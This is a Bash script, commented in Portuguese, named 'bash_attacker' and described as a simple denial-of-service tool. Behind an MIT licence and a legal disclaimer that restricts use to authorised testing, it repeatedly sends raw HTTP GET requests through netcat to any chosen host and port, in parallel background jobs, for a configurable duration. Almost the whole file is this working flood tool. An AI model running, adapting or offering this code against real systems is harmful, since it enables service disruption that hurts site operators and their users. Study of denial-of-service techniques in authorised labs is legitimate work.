#!/usr/bin/env bash

# Nome: bash_attacker
# Autor: Erik Castro
# Data de Criação: 08/10/2024
# Data de modificação: 08/10/2024
# Decription: Simples script de ataque de negação de
# serviço.
# Versão: 0.0.1-alpha
# # ================================================
# Versões:
# -----------
# Versão 0.0.1-alpha: Código básico implementado.
#
# =====================================================
# Licensa:
# ------------
# Copyright 2024 Erik Castro
#
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
# =====================================================
# AVISO LEGAL:
# ------------
# Este software é uma ferramenta de pesquisa e desenvolvimento em segurança da informação, especificamente projetada para simular ataques de negação de serviço (DoS).
#
# É distribuído sob a licença MIT e seu código fonte está disponível publicamente. No entanto, o uso desta ferramenta deve ser restrito a ambientes de testes autorizados e com o objetivo exclusivo de estudar e compreender vulnerabilidades em sistemas de computação.
#
# O autor não se responsabiliza por qualquer uso indevido ou ilícito deste software, incluindo, mas não se limitando a: ataques a sistemas produtivos, violação de leis e regulamentos, ou danos a terceiros.
#
# Ao utilizar esta ferramenta, o usuário concorda em:
#
#    Cumprir integralmente a Lei Geral de Proteção de Dados (LGPD), especialmente no que diz respeito ao tratamento de dados pessoais.
#    Respeitar a legislação brasileira, em particular o Código Penal, no que se refere aos crimes cibernéticos.
#    Obter todas as autorizações necessárias antes de realizar qualquer teste de penetração ou simulação de ataque.
#    Não direcionar ataques a sistemas ou redes sem autorização expressa.
#
# A distribuição, modificação ou comercialização desta ferramenta sem a devida atribuição de autoria é proibida.
#
# Este software é fornecido "como está", sem qualquer garantia expressa ou implícita.
#

# Chaves
host_alvo="localhost"
porta_alvo="80"
threads_atual=1
requisicoes=100
tempo_ataque=35

# despeja uma mensagem para a saída de erro padrão com data e hora.
msg_erro() {
    printf "[ERRO]: %s \t %s\n" "$*" "$(date +'%d/%m/%Y %X')" >&2
}

# Mostra a versão atual do software
exibe_versao() {
    echo -n "$(basename $0)"
    grep -E "^# Versão " $0 | tail -n1 | sed 's/^#//g' | cut -d: -f1
    printf "Copyright \u00A9 2024 Erik Castro\nUse \"--show\" para mais informações.\n\n"
}

# Exibe a Licença de SoftWare.
exibe_licen() {
    echo
    awk '/# Copyright/,/# THE SOFTWARE/' $0 | tr -d "\#" | sed "s/^# //g" | sed '$d'
}

# Exibe o histórico de atualizações
exibe_hist() {
    echo -e " ----------\n  Versões:\n ----------"
    grep -w "^# Versão" $0 | tr -d "\#" | sed '1d' | column -s: -t
}

# Exibe instruções de uso
exibe_uso() {
    echo "Uso: $0 [opções]"
    echo "Opções:"
    echo "  -h, --help     Exibe esta mensagem de ajuda"
    echo "  --change-log   Exibe o histórico de mudanças"
    echo "  --show         Exibe a licença"
    echo "  -v, --version   Exibe a versão"

}

# Faz a requisição
requisitar() {
    local host=$1
    local port=$2
    echo -ne "GET / HTTP/1.1\r\nHost: $host\r\n\r\n" | nc -vq 1 $host $port
}

# Valida se ip é valido (IPv4)
validar_ip() {
    local ip="$1"
    # Verifica se o IP está no formato correto de IPv4
    if [[ $ip =~ ^([[:digit:]]{1,3}\.){3}[[:digit:]]{1,3}$ ]]; then
        return 0
    fi
    return 1
}

# Valida se é um host válido (domínio ou IP)
validar_host() {
    local host="$1"

    # Expressão regular para validar um nome de domínio (inclui subdomínios e domínios de TLD com mais de 3 letras)
    if [[ $host =~ ^(([a-zA-Z0-9](-*[a-zA-Z0-9])*)\.)+[a-zA-Z]{2,}$ ]]; then
        return 0
    # Verifica se é um IP válido
    elif validar_ip "$host"; then
        return 0
    else
        return 1
    fi
}

# valida a entrada de paramêtros
menu_check() {
    local params=("$@")

    while [[ -n $1 ]]; do
        case "$1" in
	-p|--port)
	    shift
	    [[ "$1" -ge 1  ]] && porta_alvo="$1" 
	;;
	-t|--time)
	    shift
	    [[ "$1" -gt 0 ]] && tempo_ataque="$1"
	    ;;
	-c|--childs)
	    shift
	    [[ "$1" -gt 0 ]] && threads_atual="$1"
	    ;;
        -host)
            shift
            if validar_host "$1"; then
                host_alvo="$1"
            else
                msg_erro "Host: \"$1\" inválido!"
                return 1
            fi
            ;;
        -d | --debug) set -x ;;
        -h | --help)
            exibe_uso
            exit 0
            ;;
        --change-log)
            exibe_hist
            exit 0
            ;;
        --show)
            exibe_licen
            exit 0
            ;;
        -v | --version)
            exibe_versao
            exit 0
            ;;
        *)
            msg_erro "Paramêtro fornecido: \"$1\", invalido!"
            return 1
            ;;
        esac
        shift
    done
    return 0
}

ataque(){
    local controle=0 # Variavel de controle.
    local host="$1"
    local port="$2"
    local t_ataque="$3"
    local t_final="$((SECONDS+t_ataque))"

    while [[ SECONDS -lt t_final  ]]; do
       requisitar $host $port  &
       ((controle++))
       if [[ "$controle" -ge "$threads_atual" ]]; then
          wait -n # Espera até que uma termine
	  ((controle--))
       fi
    done
}

main() {
    menu_check $@ || exit 1 
    ataque $host_alvo $porta_alvo "$tempo_ataque"
    wait # Aguarda que todod terminem
    return 0
}

main $@ && echo encerrado
